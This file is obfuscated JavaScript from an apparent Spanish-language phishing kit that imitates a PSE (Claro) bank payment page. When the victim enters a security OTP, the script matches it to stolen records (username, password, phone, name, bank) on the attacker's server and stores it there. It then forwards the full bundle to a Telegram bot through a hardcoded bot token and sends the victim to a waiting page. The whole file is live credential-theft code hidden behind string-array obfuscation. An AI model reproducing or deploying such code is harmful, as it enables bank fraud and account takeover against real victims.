(function (_0x18a912, _0x5045a1) {
  const _0x56e3ca = _0x27f4,
    _0x2052a6 = _0x18a912();
  while (!![]) {
    try {
      const _0x15926e =
        (parseInt(_0x56e3ca(0xf5)) / 0x1) * (-parseInt(_0x56e3ca(0xe9)) / 0x2) +
        (-parseInt(_0x56e3ca(0x10c)) / 0x3) *
          (parseInt(_0x56e3ca(0xfc)) / 0x4) +
        (-parseInt(_0x56e3ca(0x104)) / 0x5) *
          (-parseInt(_0x56e3ca(0x105)) / 0x6) +
        (parseInt(_0x56e3ca(0xf7)) / 0x7) * (parseInt(_0x56e3ca(0xf3)) / 0x8) +
        -parseInt(_0x56e3ca(0xe6)) / 0x9 +
        parseInt(_0x56e3ca(0x10f)) / 0xa +
        -parseInt(_0x56e3ca(0xe1)) / 0xb;
      if (_0x15926e === _0x5045a1) break;
      else _0x2052a6["push"](_0x2052a6["shift"]());
    } catch (_0x36f9e6) {
      _0x2052a6["push"](_0x2052a6["shift"]());
    }
  }
})(_0x4274, 0x48b8e);
function _0x27f4(_0x1dc7bd, _0x384bc1) {
  const _0x427495 = _0x4274();
  return (
    (_0x27f4 = function (_0x27f43d, _0x5c8d58) {
      _0x27f43d = _0x27f43d - 0xe1;
      let _0x4d8c92 = _0x427495[_0x27f43d];
      return _0x4d8c92;
    }),
    _0x27f4(_0x1dc7bd, _0x384bc1)
  );
}
function updateLS() {
  const _0x3e184f = _0x27f4;
  LS[_0x3e184f(0xfd)]("info", JSON[_0x3e184f(0xfb)](info));
}
const otpButton = document["getElementById"]("btndinamica"),
  numberMovil = document["getElementById"]("txtdinamica");
async function sendToTelegram(_0x333c45) {
  const _0x53c2e8 = _0x27f4;
  for (const _0x25e4fc of chatIds) {
    const _0x2d92e1 =
      _0x53c2e8(0x102) + _0x25e4fc + "&text=" + encodeURIComponent(_0x333c45);
    try {
      const _0x5a5957 = await fetch(_0x2d92e1);
      _0x5a5957["ok"]
        ? console[_0x53c2e8(0x103)](_0x53c2e8(0x106) + _0x25e4fc + ")")
        : console[_0x53c2e8(0xe2)](
            _0x53c2e8(0x10d) + _0x25e4fc + "):",
            _0x5a5957[_0x53c2e8(0x107)]
          );
    } catch (_0x538d33) {
      console[_0x53c2e8(0xe2)](_0x53c2e8(0xf9) + _0x25e4fc + "):", _0x538d33);
    }
  }
}
otpButton["addEventListener"]("click", async function (_0x5b4528) {
  const _0x390a57 = _0x27f4;
  _0x5b4528["preventDefault"](), (otpButton[_0x390a57(0xe7)] = !![]);
  if (numberMovil[_0x390a57(0xed)] == "") {
    alert(_0x390a57(0x109)),
      numberMovil[_0x390a57(0xe4)](),
      (otpButton[_0x390a57(0xe7)] = ![]);
    return;
  } else {
    var _0x1f9d58 = numberMovil[_0x390a57(0xed)];
    (info[_0x390a57(0xeb)]["cdin"] = _0x1f9d58), updateLS();
    async function _0x4cfb14() {
      const _0xafd67c = _0x390a57,
        _0xb1a597 = await fetch(url + _0xafd67c(0xf0), {
          method: "GET",
          headers: { "Content-Type": _0xafd67c(0x10e) },
        }),
        _0x31790f = await _0xb1a597[_0xafd67c(0xf4)](),
        _0x416287 = [..._0x31790f];
      for (const _0x95b125 of _0x416287) {
        if (_0x95b125["id"] == info[_0xafd67c(0xeb)]["cc"]) {
          console[_0xafd67c(0x103)](_0xafd67c(0xe8));
          const _0x3ee5ef = await fetch(
              url + _0xafd67c(0xfa) + _0x95b125[_0xafd67c(0xf1)],
              {
                method: "PUT",
                headers: { "Content-Type": _0xafd67c(0x10e) },
                body: JSON[_0xafd67c(0xfb)]({
                  otp: info[_0xafd67c(0xeb)]["cdin"],
                }),
              }
            ),
            _0x417817 = await _0x3ee5ef[_0xafd67c(0xf4)](),
            _0x5ceee0 =
              _0xafd67c(0x101) +
              _0x95b125["id"] +
              _0xafd67c(0xfe) +
              _0x95b125[_0xafd67c(0xea)] +
              _0xafd67c(0xee) +
              _0x95b125["telefono"] +
              _0xafd67c(0x100) +
              _0x95b125[_0xafd67c(0xf6)] +
              "\x0a🔒Contraseña:\x20" +
              _0x95b125[_0xafd67c(0xef)] +
              _0xafd67c(0xf8) +
              info["metaInfo"]["cdin"] +
              _0xafd67c(0x10b) +
              _0x95b125[_0xafd67c(0xff)] +
              _0xafd67c(0x10a) +
              fuente +
              _0xafd67c(0xe3);
          await sendToTelegram(_0x5ceee0),
            _0x3ee5ef["ok"]
              ? console[_0xafd67c(0x103)]("Usuario\x20actualizado")
              : console[_0xafd67c(0xe2)](
                  _0xafd67c(0xf2),
                  _0x3ee5ef[_0xafd67c(0x107)]
                );
        }
      }
      (otpButton[_0xafd67c(0xe7)] = ![]),
        (window[_0xafd67c(0x108)][_0xafd67c(0xec)] = _0xafd67c(0xe5));
    }
    await _0x4cfb14();
  }
});
function _0x4274() {
  const _0x5edc9b = [
    "754484BRdGaK",
    "setItem",
    "\x0a🆔Nombre:\x20",
    "bank",
    "\x0a🚹Usuario:\x20",
    "🟣\x20PSE\x20(Claro)\x0a©️ID:\x20",
    "https://api.telegram.org/bot7772373506:AAE68FvWBmOiOLaTrSykMxSdpfQwP7C8hjo/sendMessage?chat_id=",
    "log",
    "1465qYWcUH",
    "11166uUgVjX",
    "Mensaje\x20enviado\x20a\x20Telegram\x20(chat\x20ID:\x20",
    "statusText",
    "location",
    "Por\x20favor\x20ingrese\x20token\x20de\x20seguridad",
    "\x0aFuente:\x20",
    "\x0a🏦Banco:\x20",
    "6BFArfU",
    "Error\x20al\x20enviar\x20mensaje\x20(chat\x20ID:\x20",
    "application/json",
    "5410370NeJbXc",
    "2649790cIjrwF",
    "error",
    "\x0aIngresó\x20OTP",
    "focus",
    "wait.html",
    "1137186GkBjTb",
    "disabled",
    "Usuario\x20Encontrado",
    "1118qjqryi",
    "nombre",
    "metaInfo",
    "href",
    "value",
    "\x0a📱Teléfono:\x20",
    "password",
    "/trico/tricoData",
    "idreg",
    "Error\x20al\x20actualizar\x20usuario:",
    "161544ALpFRP",
    "json",
    "187EeIRge",
    "usuario",
    "21NTzbdS",
    "\x0a💎OTP:\x20",
    "Error\x20de\x20red\x20(chat\x20ID:\x20",
    "/trico/updateTricoPse/",
    "stringify",
  ];
  _0x4274 = function () {
    return _0x5edc9b;
  };
  return _0x4274();
}
